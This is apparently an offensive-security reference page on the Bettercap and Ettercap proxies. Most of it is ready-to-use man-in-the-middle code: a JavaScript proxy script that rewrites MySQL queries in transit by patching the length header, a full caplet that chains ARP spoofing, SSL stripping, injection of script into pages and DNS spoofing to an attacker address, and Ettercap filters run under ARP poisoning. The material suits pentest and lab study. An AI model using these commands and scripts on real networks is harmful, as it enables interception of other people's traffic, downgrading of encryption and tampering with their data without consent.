---
title: "Proxies (Bettercap & Ettercap)"
---

# 🔀 Proxies

Both Bettercap and Ettercap offer transparent proxies for packet modification.
They share a **buffer-size constraint**: the returned buffer must keep the same
length. But for **self-delimited protocols** (MySQL, RESP, HTTP), you can patch
the protocol header to change the _logical_ payload size.

## Resources

- [Bettercap tcp.proxy](https://www.bettercap.org/modules/ethernet/proxies/tcpproxy/)
- [Bettercap http.proxy](https://www.bettercap.org/modules/ethernet/proxies/httpproxy/)
- [Ettercap etterfilter](https://manpages.debian.org/unstable/ettercap-common/etterfilter.8.en.html)

## Bettercap

Bettercap provides dedicated proxies for different protocols.

### tcp.proxy

Transparent TCP proxy scriptable in JavaScript (ES5 only).
Redirects TCP traffic from `tcp.address:tcp.port` to a local proxy.

```bash
set tcp.address <REMOTE_SERVER_IP>
set tcp.port <REMOTE_PORT>          # Default: 443
set tcp.proxy.port 8443             # Local bind port (default: 8443)
set tcp.proxy.script /path/to/script.js
tcp.proxy on
```

### MySQL Example: Expand a SHOW TABLES query

MySQL packets start with a **4-byte header**:

```
[3 bytes: payload length, little-endian] [1 byte: sequence ID] [payload]
```

The trick: modify the SQL payload, then patch the first byte of `data`
(which is the low byte of the MySQL length field).

```javascript
function charToInt(value) {
  return value.charCodeAt(0);
}

function onData(from, to, data) {
  var str = String.fromCharCode.apply(null, data);
  var motif = "SHOW TABLES LIKE 'user%'";
  var remplacement = "SHOW TABLES LIKE '%'";

  if (str.indexOf(motif) !== -1) {
    var newStr = str.replace(motif, remplacement);
    var res_int = [];
    for (var i = 0; i < newStr.length; i++) {
      res_int.push(newStr.charCodeAt(i));
    }
    // Patch MySQL header: first byte = new payload length
    // (only valid if length < 256, otherwise patch 3 bytes LE)
    res_int[0] = remplacement.length + 1;
    log_info("MySQL query rewritten: " + motif + " -> " + remplacement);
    return res_int;
  }

  return data;
}
```

::: warning

- `data` is an array of bytes, not a string
- The **returned array must have the same length** as the original `data`
- Patching only `res_int[0]` works if the new payload is < 256 bytes
  (otherwise you need to patch the 3-byte little-endian length)
- This trick works because MySQL carries its own length field.
  It would **not** work for raw TCP.

:::

**Tunnel to mitmproxy:**

```bash
set tcp.address 10.0.0.42
set tcp.port 3306
set tcp.tunnel.address 127.0.0.1
set tcp.tunnel.port 8080
tcp.proxy on
```

### http.proxy

```bash
set http.proxy.sslstrip true
set http.proxy.injectjs <URL_OR_PATH>
set http.proxy.port 8080
http.proxy on
```

### dns.spoof

```bash
set dns.spoof.domains example.com,*.example.com
set dns.spoof.address <ATTACKER_IP>
# dns.spoof.all true  # Answer ALL queries
dns.spoof on
```

### Full MITM Caplet

::: details

```ini
# Discovery
net.probe on
net.recon on
net.show

# ARP Spoofing
set arp.spoof.targets <TARGET_IP>
set arp.spoof.fullduplex true
set arp.spoof.forwarding true
arp.spoof on

# HTTP Proxy with SSL Strip
set http.proxy.sslstrip true
set http.proxy.injectjs <URL>
http.proxy on

# DNS Spoofing
set dns.spoof.domains target.com,*.target.com
set dns.spoof.address <ATTACKER_IP>
dns.spoof on

# Sniffing
net.sniff on
set net.sniff.verbose true
set net.sniff.filter 'not arp'
```

:::

## Ettercap

Ettercap uses a compiled filter language to modify packets on the fly.
Payload length **must stay the same** for raw TCP. For self-delimited
protocols, you can patch the protocol header like with Bettercap.

### Workflow

```bash
# 1. Write filter
cat > filter.ecf << 'EOF'
if (ip.proto == TCP && tcp.dst == 3306) {
    if (search(DATA.data, "SHOW TABLES LIKE 'user%'")) {
        replace("SHOW TABLES LIKE 'user%'", "SHOW TABLES LIKE '%'");
        msg("MySQL query rewritten\n");
    }
}
EOF

# 2. Compile
etterfilter filter.ecf -o filter.ef

# 3. Run with MITM
ettercap -T -q -i eth0 -M arp:remote -F filter.ef /<TARGET_IP>// /<GATEWAY_IP>//
```

### Useful Filter Functions

::: details

| Function                      | Description                       |
| ----------------------------- | --------------------------------- |
| `search(DATA.data, "string")` | Search for a string in payload    |
| `replace("old", "new")`       | Replace (same length for raw TCP) |
| `drop()`                      | Drop the packet                   |
| `inject("./file")`            | Inject file content after packet  |
| `msg("text")`                 | Display message                   |
| `kill()`                      | Send RST to kill connection       |

:::

### Example: HTTP Header Replacement

```c
if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "Accept-Encoding")) {
        replace("Accept-Encoding", "Accept-Rubbish!");
        msg("zapped Accept-Encoding!\n");
    }
}
```

**Note:** `Accept-Encoding` (15 chars) -> `Accept-Rubbish!` (15 chars). Same length works.
